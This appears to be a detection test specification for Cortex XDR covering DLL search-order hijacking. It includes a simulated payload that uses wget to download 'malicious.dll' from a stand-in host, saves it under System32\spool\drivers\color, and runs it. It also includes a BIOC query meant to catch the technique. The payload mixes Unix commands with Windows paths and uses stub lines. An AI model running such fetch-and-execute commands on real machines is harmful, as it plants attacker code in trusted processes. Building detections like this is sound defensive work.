identity.name: Uncommon DLL Side-Loaded into Microsoft Process via Search-Order Hijack
identity.summary: An attacker places a rarely-seen DLL signed by an uncommon vendor into a directory that is searched before Microsoft's directories, causing a Microsoft-signed process to load it. Cortex should detect
identity.description: An attacker places a rarely-seen DLL signed by an uncommon vendor into a directory that is searched before Microsoft's directories, causing a Microsoft-signed process to load it. Cortex should detect this hijacking event and flag the uncommon DLL signer.

techniques.name: Hijack Execution Flow: DLL Search Order Hijacking / Side-Loading

payload.code:
mkdir -p C:\Windows\System32\spool\drivers\color
wget -O C:\Windows\System32\spool\drivers\color\msvcr120.dll https://example.com/malicious.dll
stub chmod +x C:\Windows\System32\spool\drivers\color\msvcr120.dll
stub exec C:\Windows\System32\spool\drivers\color\msvcr120.dll

expected_artifacts.description: Suspicious DLL placed in hijack location

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: A rare DLL signed by an uncommon vendor was hijacked into a Microsoft process
biocs.description: Detection of a DLL with uncommon signing authority loaded into a Microsoft process via search-order hijack
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name contains 'Microsoft'
| filter action_file_path contains 'spool/drivers/color'
| filter action_file_path contains 'msvcr120.dll'
| filter action_file_path contains 'C:\\Windows\\System32\\spool\\drivers\\color\\msvcr120.dll'
